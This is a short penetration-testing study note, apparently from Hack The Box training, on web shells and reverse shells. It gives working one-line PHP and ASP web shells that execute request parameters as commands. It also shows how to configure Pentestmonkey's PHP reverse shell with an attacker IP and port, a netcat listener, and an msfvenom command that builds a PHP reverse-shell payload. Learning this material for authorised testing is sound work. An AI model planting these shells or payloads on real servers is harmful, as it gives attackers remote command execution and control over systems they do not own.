---
title: a-Shell
draft: false
tags:
  - web-shell
---
## Web Shells

There are lot of good web shells online such as [phpbash](https://github.com/Arrexel/phpbash)and p0wny-shell.

SecLists also have Web-shells in the `/opt/useful/SecLists/Web-Shells` directory.

## Custom Web Shell

e.g `PHP` web shell

```php
<?php system($_REQUEST['cmd']); ?>
```

We can execute commands by:

```php
?cmd=id
```

e.g `.NET` web shell

```asp
<% eval request('cmd') %>
```

## Reverse Shell

Pentestmonkey's PHP reverse shell is well known.

When using, we have to change the following lines:

```php
$ip = 'OUR_IP';     // CHANGE THIS
$port = OUR_PORT;   // CHANGE THIS
```

Our netcat listener will intercept the incoming reverse shell connection request:

```bash
nc -lvnp OUR_PORT
```

## Custom Reverse Shell 

Sometimes `system` function is not allowed.

This is why we custom reverse shell sometimes.

We can use tools like `msfvenom` to create a reverse shell:

```shell-session
jadu101@htb[/htb]$ msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php
...SNIP...
Payload size: 3033 bytes
```


